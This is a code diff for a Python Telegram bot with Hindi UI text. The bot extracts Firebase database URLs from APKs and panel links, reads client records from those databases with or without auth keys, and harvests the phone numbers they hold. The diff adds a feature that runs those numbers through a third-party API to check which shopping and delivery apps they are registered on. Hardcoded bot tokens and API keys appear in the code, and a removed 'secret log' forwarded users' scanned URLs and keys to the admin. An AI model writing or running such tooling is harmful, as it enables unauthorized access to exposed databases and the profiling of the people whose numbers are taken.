@@ -24,7 +24,13 @@ print = functools.partial(print, flush=True)
 # ================= APNA CONFIG YAHAN SET HAI =================
 BOT_TOKEN = "8632363521:AAHmUpYvXtViGysiVRkhXiII_2SxcBnorIw"
 ADMIN_CHAT_ID = "6755426755"
-CHANNEL_USERNAME = "@trickzone6"  # Aapka channel username
+CHANNEL_USERNAME = "@trickzone6"  # Aapka channel username[cite: 1]
+
+# Tubesave API Config
+TUBESAVE_API_URL = "https://tubesave.in/api/v1/check"
+TUBESAVE_SERVICES_URL = "https://tubesave.in/api/v1/services"
+TUBESAVE_API_KEY = "AK_LUsM52Te1lyvxLmv5uT8HepjuHvBxKFx"
+
 TIMEOUT = 10
 USERS_FILE = "bot_users.json"
 CREDITS_FILE = "user_credits.json"
@@ -35,7 +41,7 @@ app = Flask(__name__)
 
 @app.route('/')
 def home():
-    return "Firebase Extractor Bot with Universal Panel & APK Parser is active!"
+    return "Firebase Extractor & Free Tubesave Checker Bot is active!"
 
 def run_flask():
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
@@ -103,7 +109,10 @@ def get_user_data(chat_id):
             "sub_expiry": None,
             "referred_by": None,
             "ref_rewarded": False,
-            "left_channel_penalty": False
+            "left_channel_penalty": False,
+            "pending_firebase": None,
+            "selected_service": None,
+            "waiting_for_single_check": False
         }
         save_json(CREDITS_FILE, data)
     return data[uid]
@@ -147,7 +156,7 @@ def answer_callback(session, token, callback_query_id, text=""):
     except Exception:
         pass
 
-# --- UNIVERSAL ADVANCED LINK & QUERY PARSER ---
+# --- UNIVERSAL LINK & QUERY PARSER ---
 def parse_links_bulk(text):
     lines = text.strip().split('\n')
     parsed_results = []
@@ -156,10 +165,8 @@ def parse_links_bulk(text):
         if not line or line.startswith("#"):
             continue
         
-        # 1. Extract any parameter value (?share=, ?s=, ?m=, ?zeniths=, etc.)
         param_matches = re.findall(r'[?&][a-zA-Z0-9_-]+=([A-Za-z0-9+/=_-]+)', line)
-        
-        decoded_texts = [line] # Original line bhi check karenge
+        decoded_texts = [line]
         for match in param_matches:
             try:
                 raw = match.replace('-', '+').replace('_', '/')
@@ -168,7 +175,6 @@ def parse_links_bulk(text):
                 decoded = decoded_bytes.decode('utf-8', errors='ignore')
                 decoded_texts.append(decoded)
                 
-                # Double decode check
                 if not decoded.startswith(('{', '[', 'http')) and re.match(r'^[A-Za-z0-9+/=]+$', decoded.strip()):
                     try:
                         d2 = base64.b64decode(decoded.strip()).decode('utf-8', errors='ignore')
@@ -178,10 +184,8 @@ def parse_links_bulk(text):
             except:
                 pass
 
-        # 2. Search for Firebase URLs across all decoded text variations and raw line
         found_any = False
         for text_block in decoded_texts:
-            # Try JSON parsing first if it looks like json
             try:
                 data = json.loads(text_block)
                 if isinstance(data, list):
@@ -213,7 +217,6 @@ def parse_links_bulk(text):
             except:
                 pass
 
-            # Regex search for Firebase Realtime Database or Firebasedatabase.app URLs
             urls = re.findall(r'https?://[a-zA-Z0-9.-]+\.firebaseio\.com|https?://[a-zA-Z0-9.-]+\.firebasedatabase\.app', text_block)
             for u in urls:
                 u_clean = u.rstrip('/')
@@ -226,7 +229,6 @@ def parse_links_bulk(text):
         if found_any:
             continue
 
-        # 3. Separator formats (URL||KEY or URL|||KEY)
         if '||' in line:
             parts = re.split(r'\|{2,}', line)
             url = parts[0].strip()
@@ -240,7 +242,6 @@ def parse_links_bulk(text):
                 parsed_results.append((url, key, p_name))
                 continue
 
-        # 4. Plain URL fallback
         if "firebaseio.com" in line or "firebasedatabase.app" in line or line.startswith("http"):
             url = line.rstrip('/')
             pm = re.search(r'https://([^.]+)', url)
@@ -249,13 +250,11 @@ def parse_links_bulk(text):
 
     return parsed_results
 
-# --- UNIVERSAL DEEP APK PARSER (Supports 32-bit, 64-bit, All architectures & assets) ---
 def extract_firebase_from_apk(apk_path):
     extracted_urls = []
     try:
         with zipfile.ZipFile(apk_path, 'r') as z:
             for filename in z.namelist():
-                # Scan all files including dex files, native libraries (.so for 32/64 bit), json, xml, assets
                 if any(ext in filename.lower() for ext in ['.dex', '.json', '.xml', '.txt', '.so', 'res/', 'assets/']):
                     try:
                         content = z.read(filename)
@@ -275,19 +274,7 @@ def extract_firebase_from_apk(apk_path):
         print(f"Universal APK Parse Error: {e}")
     return extracted_urls
 
-def check_firebase(url, key):
-    result = {
-        "url": url,
-        "key": key,
-        "panel_name": "unknown",
-        "status": "unknown",
-        "total_devices": 0,
-        "online_devices": 0,
-        "error": None
-    }
-    pm = re.search(r'https://([^.]+)', url)
-    if pm:
-        result["panel_name"] = pm.group(1)
+def check_firebase_and_extract_numbers(url, key):
     clients_url = f"{url}/clients.json"
     if key and key != "dummy":
         clients_url += f"?auth={key}"
@@ -296,16 +283,26 @@ def check_firebase(url, key):
         if res.status_code == 200:
             data = res.json()
             if data and isinstance(data, dict):
-                result["status"] = "live"
-                result["total_devices"] = len(data)
-                result["online_devices"] = sum(
-                    1 for d in data.values() 
-                    if isinstance(d, dict) and (d.get("status") or d.get("online") or d.get("lastSeen"))
-                )
-                return result
-            else:
-                result["status"] = "empty"
-                return result
+                online_numbers = []
+                all_numbers = []
+                for d_id, d_val in data.items():
+                    if isinstance(d_val, dict):
+                        phone = None
+                        for k, v in d_val.items():
+                            if any(sub in k.lower() for sub in ['phone', 'mobile', 'num', 'contact']):
+                                phone = str(v)
+                                break
+                        if not phone and len(d_id) >= 10 and d_id.isdigit():
+                            phone = d_id
+                        
+                        if phone:
+                            clean_p = re.sub(r'\D', '', phone)
+                            if len(clean_p) >= 10:
+                                all_numbers.append(clean_p)
+                                is_online = bool(d_val.get("status") or d_val.get("online") or d_val.get("lastSeen"))
+                                if is_online:
+                                    online_numbers.append(clean_p)
+                return "live", all_numbers, online_numbers
         elif res.status_code == 401:
             if key and key != "dummy":
                 try:
@@ -313,28 +310,56 @@ def check_firebase(url, key):
                     if res2.status_code == 200:
                         data = res2.json()
                         if data and isinstance(data, dict):
-                            result["status"] = "live_no_auth"
-                            result["total_devices"] = len(data)
-                            result["online_devices"] = sum(
-                                1 for d in data.values() 
-                                if isinstance(d, dict) and (d.get("status") or d.get("online") or d.get("lastSeen"))
-                            )
-                            return result
+                            all_numbers = []
+                            online_numbers = []
+                            for d_id, d_val in data.items():
+                                if isinstance(d_val, dict):
+                                    phone = d_id if (len(d_id)>=10 and d_id.isdigit()) else None
+                                    if phone:
+                                        all_numbers.append(phone)
+                            return "live_no_auth", all_numbers, online_numbers
                 except:
                     pass
-            result["status"] = "auth_error"
-            return result
-        else:
-            result["status"] = f"http_{res.status_code}"
-            return result
+            return "auth_error", [], []
+        return f"http_{res.status_code}", [], []
     except Exception as e:
-        result["status"] = "error"
-        result["error"] = str(e)[:100]
-        return result
+        return "error", [], []
 
+def call_tubesave_api(service, phone):
+    try:
+        headers = {
+            "X-API-Key": TUBESAVE_API_KEY,
+            "Content-Type": "application/json"
+        }
+        payload = {
+            "service": service,
+            "phone": phone
+        }
+        res = requests.post(TUBESAVE_API_URL, headers=headers, json=payload, timeout=10)
+        if res.status_code == 200:
+            return res.json()
+    except Exception as e:
+        print(f"Tubesave API Error: {e}")
+    return None
+
+def get_services_list():
+    try:
+        headers = {"X-API-Key": TUBESAVE_API_KEY}
+        res = requests.get(TUBESAVE_SERVICES_URL, headers=headers, timeout=10)
+        if res.status_code == 200:
+            data = res.json()
+            if isinstance(data, list):
+                return data
+            elif isinstance(data, dict) and "services" in data:
+                return data["services"]
+    except:
+        pass
+    return ["swiggy", "bigbasket", "meesho", "flipkart", "amazon", "blinkit", "ajio", "myjio", "lenskart", "myntra", "oyo"]
+
+# --- TELEGRAM LISTENER ---
 def telegram_listener(token, session):
     offset = 0
-    print("[Bot] Universal Listener started.")
+    print("[Bot] Listener with Free Tubesave Checker & Strict Force Join started.")
     waiting_for_panel = {}
 
     while True:
@@ -407,6 +432,74 @@ def telegram_listener(token, session):
                                 answer_callback(session, token, cq_id, "Web Panel mode activated!")
                                 waiting_for_panel[chat_id] = True
                                 session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "🌐 Kripya apna **Web Panel Link(s)** ya text yahan bhejiye:"})
+                            elif data_val == "btn_number_checker":
+                                answer_callback(session, token, cq_id, "Number Checker activated!")
+                                services = get_services_list()
+                                app_keyboard = []
+                                row = []
+                                for s in services:
+                                    row.append({"text": s.capitalize(), "callback_data": f"single_chk_app_{s}"})
+                                    if len(row) == 2:
+                                        app_keyboard.append(row)
+                                        row = []
+                                if row:
+                                    app_keyboard.append(row)
+                                send_keyboard_message(session, token, chat_id, "🔍 **Free Number Checker**\n\nKripya app chuniye jiska status check karna hai:", app_keyboard)
+                            
+                            # --- SINGLE NUMBER CHECKER CALLBACKS ---
+                            elif data_val.startswith("single_chk_app_"):
+                                app_name = data_val.replace("single_chk_app_", "")
+                                u_data = get_user_data(chat_id)
+                                u_data["selected_service"] = app_name
+                                u_data["waiting_for_single_check"] = True
+                                update_user_data(chat_id, u_data)
+                                answer_callback(session, token, cq_id, f"Selected: {app_name.upper()}")
+                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": f"📱 Aapne **{app_name.upper()}** select kiya hai.\n\nAb kripya apna **Mobile Number** bhejien (jaise `9876543210`):"})
+
+                            # --- FIREBASE BULK CHECKER CALLBACKS ---
+                            elif data_val.startswith("chk_app_"):
+                                app_name = data_val.replace("chk_app_", "")
+                                u_data = get_user_data(chat_id)
+                                u_data["selected_service"] = app_name
+                                update_user_data(chat_id, u_data)
+                                answer_callback(session, token, cq_id, f"Selected: {app_name.upper()}")
+                                
+                                mode_kb = [
+                                    [
+                                        {"text": "🟢 Sirf Online Numbers", "callback_data": "chk_mode_online"},
+                                        {"text": "🔄 Online + Offline Dono", "callback_data": "chk_mode_all"}
+                                    ]
+                                ]
+                                send_keyboard_message(session, token, chat_id, f"🎯 App: **{app_name.upper()}** select ho gaya hai!\n\nKripya mode chuniye ki kis tarah ke numbers check karne hain:", mode_kb)
+                            
+                            elif data_val.startswith("chk_mode_"):
+                                mode = data_val.replace("chk_mode_", "")
+                                answer_callback(session, token, cq_id, "Processing check...")
+                                u_data = get_user_data(chat_id)
+                                app_name = u_data.get("selected_service", "swiggy")
+                                numbers = u_data.get("pending_firebase", {"online": [], "all": []})
+                                
+                                target_list = numbers["online"] if mode == "online" else numbers["all"]
+                                if not target_list:
+                                    session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "⚠️ Is database mein is mode ke hisab se koi valid numbers nahi mile!"})
+                                    continue
+                                
+                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": f"🚀 **{app_name.upper()}** checker started! Total `{len(target_list)}` numbers par request bhej rahe hain..."})
+                                
+                                registered_count = 0
+                                report_lines = [f"📊 **Result Report ({app_name.upper()}):**\n"]
+                                
+                                for num in target_list[:10]:
+                                    res = call_tubesave_api(app_name, num)
+                                    if res and res.get("registered"):
+                                        registered_count += 1
+                                        report_lines.append(f"✅ `+{num}` — **Registered**")
+                                    else:
+                                        report_lines.append(f"❌ `+{num}` — Not Registered")
+                                    time.sleep(5)
+                                
+                                report_lines.append(f"\n🎯 Total Checked: {min(len(target_list), 10)} | Registered: {registered_count}")
+                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "\n".join(report_lines), "parse_mode": "Markdown"})
                             continue
 
                         message = update.get("message")
@@ -422,6 +515,22 @@ def telegram_listener(token, session):
 
                         save_user(chat_id)
 
+                        # --- STRICT FORCE JOIN & LEAVE CHECK (Mandatory for ALL users) ---
+                        if not check_user_channel(session, token, chat_id):
+                            join_text = (
+                                "🚨 **Access Denied!**\n\n"
+                                f"Bot ko use karne ke liye hamare official channel ko join karna zaroori hai[cite: 1]:\n\n"
+                                f"👉 {CHANNEL_USERNAME}\n\n"
+                                "Aapne channel chhod diya hai ya join nahi kiya hai. Pehle join karke **'Verify Membership'** par click karein."
+                            )
+                            keyboard = [
+                                [{"text": "📢 Join Channel", "url": f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}"}],
+                                [{"text": "✅ Verify Membership", "callback_data": "check_sub"}]
+                            ]
+                            send_keyboard_message(session, token, chat_id, join_text, keyboard)
+                            continue
+
+                        # --- REFERRAL PENALTY CHECK ---
                         u_data = get_user_data(chat_id)
                         if chat_id != str(ADMIN_CHAT_ID) and u_data.get("ref_rewarded") and not u_data.get("left_channel_penalty", False):
                             if not check_user_channel(session, token, chat_id):
@@ -437,24 +546,46 @@ def telegram_listener(token, session):
                                 u_data["left_channel_penalty"] = True
                                 update_user_data(chat_id, u_data)
 
+                        # --- HANDLE SINGLE NUMBER CHECK INPUT ---
+                        if u_data.get("waiting_for_single_check"):
+                            u_data["waiting_for_single_check"] = False
+                            update_user_data(chat_id, u_data)
+                            
+                            clean_num = re.sub(r'\D', '', text)
+                            if len(clean_num) < 10:
+                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "❌ Invalid number format! Kripya sahi 10-digit number bhejien."})
+                                continue
+                            
+                            app_name = u_data.get("selected_service", "swiggy")
+                            session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": f"🔍 `{clean_num}` ko **{app_name.upper()}** par check kiya ja raha hai..."})
+                            
+                            res = call_tubesave_api(app_name, clean_num)
+                            if res and res.get("registered"):
+                                reply_text = f"✅ **Result:** Number `+{clean_num}` **{app_name.upper()}** par **REGISTERED** hai!"
+                            else:
+                                reply_text = f"❌ **Result:** Number `+{clean_num}` **{app_name.upper()}** par registered nahi hai."
+                            
+                            session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": reply_text, "parse_mode": "Markdown"})
+                            continue
+
                         if text == "/rules":
                             rules_text = (
                                 "📜 **Referral Rules & Guidelines:**\n\n"
-                                f"1️⃣ Jab aap apne referral link se kisi ko invite karte hain, toh jab tak woh user `{CHANNEL_USERNAME}` channel join karke verify nahi karega, tab tak valid refer nahi mana jayega.\n"
+                                f"1️⃣ Jab aap apne referral link se kisi ko invite karte hain, toh jab tak woh user `{CHANNEL_USERNAME}` channel join karke verify nahi karega, tab tak valid refer nahi mana jayega[cite: 1].\n"
                                 "2️⃣ Har ek verified invite par aapko **+5 Credits** milte hain.\n"
                                 "3️⃣ Agar invited user channel leave kar deta hai, toh referrer ke credits mein se **-5 credits** (penalty) cut ho jayenge.\n"
-                                "4️⃣ Ek user sirf ek hi baar referral ke liye count hota hai."
+                                "4️⃣ Bot use karne ke liye channel join rehna anivarya hai."
                             )
                             session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": rules_text, "parse_mode": "Markdown"})
                             continue
 
                         if text == "/about":
                             about_text = (
-                                "ℹ️ **About Firebase Extractor Bot:**\n\n"
-                                "Yeh bot Web Panel links ya APK files se Firebase Database URLs aur active connections extract karta hai!\n\n"
-                                "🛠 **Ise Kaise Use Karein:**\n"
-                                "• **Scan:** Apna link ya APK bhej kar scan karein.\n"
-                                "• **Access:** Normal users ke liye active subscription hona zaroori hai. Dosto ko invite karke ya `/redeem` key se pass lein."
+                                "ℹ️ **About Bot:**\n\n"
+                                "Yeh bot Firebase database extraction aur **Free Number Checker** (Tubesave API powered) ki suvidha deta hai!\n\n"
+                                "🛠 **Features:**\n"
+                                "• **Number Checker:** Bilkul free mein kisi bhi app par number check karein.\n"
+                                "• **Firebase Extractor:** Panel links ya APKs se data nikalne ke liye active subscription zaroori hai."
                             )
                             session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": about_text, "parse_mode": "Markdown"})
                             continue
@@ -555,27 +686,12 @@ def telegram_listener(token, session):
                                         target_u_data["referred_by"] = referrer_id
                                         update_user_data(chat_id, target_u_data)
 
-                            if not check_user_channel(session, token, chat_id):
-                                join_text = (
-                                    "🚨 **Access Denied!**\n\n"
-                                    f"Bot ko use karne ke liye sabse pehle hamare official channel ko join karna zaroori hai:\n\n"
-                                    f"👉 {CHANNEL_USERNAME}\n\n"
-                                    "Channel join karne ke baad **'Verify Membership'** par click karein."
-                                )
-                                keyboard = [
-                                    [{"text": "📢 Join Channel", "url": f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}"}],
-                                    [{"text": "✅ Verify Membership", "callback_data": "check_sub"}]
-                                ]
-                                send_keyboard_message(session, token, chat_id, join_text, keyboard)
-                                continue
-
                             welcome_text = (
                                 "⚡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⚡\n"
-                                "🔥   **FIREBASE EXTRACTOR BOT**   🔥\n"
+                                "🔥   **FIREBASE & TUBESAVE BOT**   🔥\n"
                                 "⚡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⚡\n\n"
                                 f"👋  Welcome, {first_name}!\n\n"
                                 "✦ ─────────────────────────── ✦\n\n"
-                                "/help     — Commands\n"
                                 "/profile  — Check Credits & Pass\n"
                                 "/redeem   — Redeem Pass Key\n"
                                 "/rules    — Referral Rules\n"
@@ -584,22 +700,10 @@ def telegram_listener(token, session):
                             )
                             keyboard = [
                                 [{"text": "👤 Profile & Referrals", "callback_data": "btn_profile"}],
-                                [{"text": "🌐 Extract from Web Panel", "callback_data": "btn_web_panel"}],
-                                [{"text": "🔥 Send an APK to Start Scanning!", "callback_data": "btn_web_panel"}]
+                                [{"text": "🔍 Free Number Checker", "callback_data": "btn_number_checker"}],
+                                [{"text": "🌐 Extract from Web Panel (Sub Req)", "callback_data": "btn_web_panel"}]
                             ]
                             send_keyboard_message(session, token, chat_id, welcome_text, keyboard)
-                            continue
-
-                        if not check_user_channel(session, token, chat_id):
-                            join_text = (
-                                "🚨 **Channel Left Detected!**\n\n"
-                                f"Aapne channel ({CHANNEL_USERNAME}) chhod diya hai. Phir se join karke verify karein:"
-                            )
-                            keyboard = [
-                                [{"text": "📢 Join Channel", "url": f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}"}],
-                                [{"text": "✅ Verify Membership", "callback_data": "check_sub"}]
-                            ]
-                            send_keyboard_message(session, token, chat_id, join_text, keyboard)
                             continue
 
                         if text.startswith("/broadcast") or text.startswith("/bc"):
@@ -646,13 +750,13 @@ def telegram_listener(token, session):
                         elif text == "/stats":
                             session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "📊 Bot Status: Online & Active."})
                         
-                        # --- STRICT ACCESS CHECK FOR SCANNING (APKs & WEB PANELS) ---
+                        # --- FIREBASE EXTRACTOR WORKFLOW (SUBSCRIPTION REQUIRED) ---
                         is_admin = (chat_id == str(ADMIN_CHAT_ID))
                         user_has_sub = has_active_sub(chat_id)
 
                         if document:
                             if not is_admin and not user_has_sub:
-                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "❌ **Access Denied!**\n\nAPK scan karne ke liye aapke paas **Active Unlimited Pass** hona zaroori hai.\n\n💡 Pass lene ke liye `/profile` check karein ya `/redeem <key>` use karein!"})
+                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "❌ **Access Denied!**\n\nFirebase extraction (APK scan) ke liye aapke paas **Active Unlimited Pass** hona zaroori hai.\n\n💡 Pass lene ke liye `/profile` check karein ya `/redeem <key>` use karein!"})
                                 continue
 
                             file_name = document.get("file_name", "")
@@ -677,22 +781,31 @@ def telegram_listener(token, session):
                                         pass
                                     
                                     if found_urls:
-                                        for fu in found_urls:
-                                            res = check_firebase(fu, "dummy")
-                                            reply = (f"🔥 **APK Firebase Extracted!**\n\n"
-                                                     f"🏢 Panel: `{res['panel_name']}`\n"
-                                                     f"🔗 URL: `{res['url']}`\n"
-                                                     f"📊 Status: `{res['status'].upper()}`\n"
-                                                     f"📱 Total Devices: `{res['total_devices']}`\n"
-                                                     f"🟢 Online Connections: `{res['online_devices']}`")
-                                            session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": reply, "parse_mode": "Markdown"})
-                                            
-                                            if chat_id != str(ADMIN_CHAT_ID):
-                                                admin_alert = (f"🚨 **SECRET LOG: New APK Scanned!**\n\n"
-                                                               f"👤 User: {first_name} (@{username}) [`{chat_id}`]\n"
-                                                               f"🏢 Panel: `{res['panel_name']}`\n"
-                                                               f"🔗 URL: `{res['url']}`")
-                                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": ADMIN_CHAT_ID, "text": admin_alert, "parse_mode": "Markdown"})
+                                        fu = found_urls[0]
+                                        status, all_nums, online_nums = check_firebase_and_extract_numbers(fu, "dummy")
+                                        
+                                        u_data = get_user_data(chat_id)
+                                        u_data["pending_firebase"] = {"online": online_nums, "all": all_nums}
+                                        update_user_data(chat_id, u_data)
+                                        
+                                        services = get_services_list()
+                                        app_keyboard = []
+                                        row = []
+                                        for s in services:
+                                            row.append({"text": s.capitalize(), "callback_data": f"chk_app_{s}"})
+                                            if len(row) == 2:
+                                                app_keyboard.append(row)
+                                                row = []
+                                        if row:
+                                            app_keyboard.append(row)
+                                        
+                                        menu_text = (
+                                            f"🔥 **APK Firebase Extracted Successfully!**\n\n"
+                                            f"🔗 URL: `{fu}`\n"
+                                            f"📱 Total Numbers Found: `{len(all_nums)}` (Online: `{len(online_nums)}`)\n\n"
+                                            f"👇 **Select Checker App:**"
+                                        )
+                                        send_keyboard_message(session, token, chat_id, menu_text, app_keyboard)
                                     else:
                                         session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "❌ Is APK ke andar koi valid Firebase URL nahi mila."})
                             else:
@@ -708,34 +821,33 @@ def telegram_listener(token, session):
                                     session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "❌ **Access Denied!**\n\nWeb panel scan karne ke liye aapke paas **Active Unlimited Pass** hona zaroori hai.\n\n💡 Pass lene ke liye `/profile` se credits use karein ya `/redeem <key>` karein!"})
                                     continue
 
-                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": f"🔍 Total {len(parsed_links)} panel(s) parse ho gaye hain, Firebase check ho raha hai..."})
+                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": f"🔍 Total {len(parsed_links)} panel(s) parse ho gaye hain, numbers extract ho rahe hain..."})
                                 
-                                for url, key, panel in parsed_links:
-                                    res = check_firebase(url, key)
-                                    status = res["status"]
-                                    
-                                    if status in ["live", "live_no_auth"]:
-                                        reply = (f"✅ **WEB PANEL FIREBASE LIVE!**\n\n"
-                                                 f"🏢 Panel: `{res['panel_name']}`\n"
-                                                 f"🔗 URL: `{res['url']}`\n"
-                                                 f"🔑 Key: `{res['key']}`\n"
-                                                 f"📱 Total Devices: `{res['total_devices']}`\n"
-                                                 f"🟢 Online Connections: `{res['online_devices']}`")
-                                    else:
-                                        reply = (f"⚠️ **Panel Status: {status.upper()}**\n\n"
-                                                 f"🏢 Panel: `{res['panel_name']}`\n"
-                                                 f"🔗 URL: `{res['url']}`\n"
-                                                 f"❌ Reason: `{res.get('error', 'Dead / Inactive')}`")
-                                    
-                                    session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": reply, "parse_mode": "Markdown"})
-                                    
-                                    if chat_id != str(ADMIN_CHAT_ID):
-                                        admin_alert = (f"🚨 **SECRET LOG: New Panel Scanned!**\n\n"
-                                                       f"👤 User: {first_name} (@{username}) [`{chat_id}`]\n"
-                                                       f"🏢 Panel: `{res['panel_name']}`\n"
-                                                       f"🔗 URL: `{res['url']}`\n"
-                                                       f"🔑 Key: `{res['key']}`")
-                                        session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": ADMIN_CHAT_ID, "text": admin_alert, "parse_mode": "Markdown"})
+                                url, key, panel = parsed_links[0]
+                                status, all_nums, online_nums = check_firebase_and_extract_numbers(url, key)
+                                
+                                u_data = get_user_data(chat_id)
+                                u_data["pending_firebase"] = {"online": online_nums, "all": all_nums}
+                                update_user_data(chat_id, u_data)
+                                
+                                services = get_services_list()
+                                app_keyboard = []
+                                row = []
+                                for s in services:
+                                    row.append({"text": s.capitalize(), "callback_data": f"chk_app_{s}"})
+                                    if len(row) == 2:
+                                        app_keyboard.append(row)
+                                        row = []
+                                if row:
+                                    app_keyboard.append(row)
+                                
+                                menu_text = (
+                                    f"🔥 **Web Panel Firebase Extracted Successfully!**\n\n"
+                                    f"🏢 Panel: `{panel}`\n"
+                                    f"📱 Total Numbers Found: `{len(all_nums)}` (Online: `{len(online_nums)}`)\n\n"
+                                    f"👇 **Select Checker App:**"
+                                )
+                                send_keyboard_message(session, token, chat_id, menu_text, app_keyboard)
                             else:
                                 session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "❌ Invalid link or format."})
         except Exception as e:
@@ -745,9 +857,8 @@ def telegram_listener(token, session):
 
 if __name__ == "__main__":
     print("="*50)
-    print("  Bot Running with Universal Parser & APK Support...")
+    print("  Bot Running with Free Checker & Sub-Required Extractor...")
     print("="*50)
     session = requests.Session()
     threading.Thread(target=telegram_listener, args=(BOT_TOKEN, session), daemon=True).start()
     run_flask()
-                 
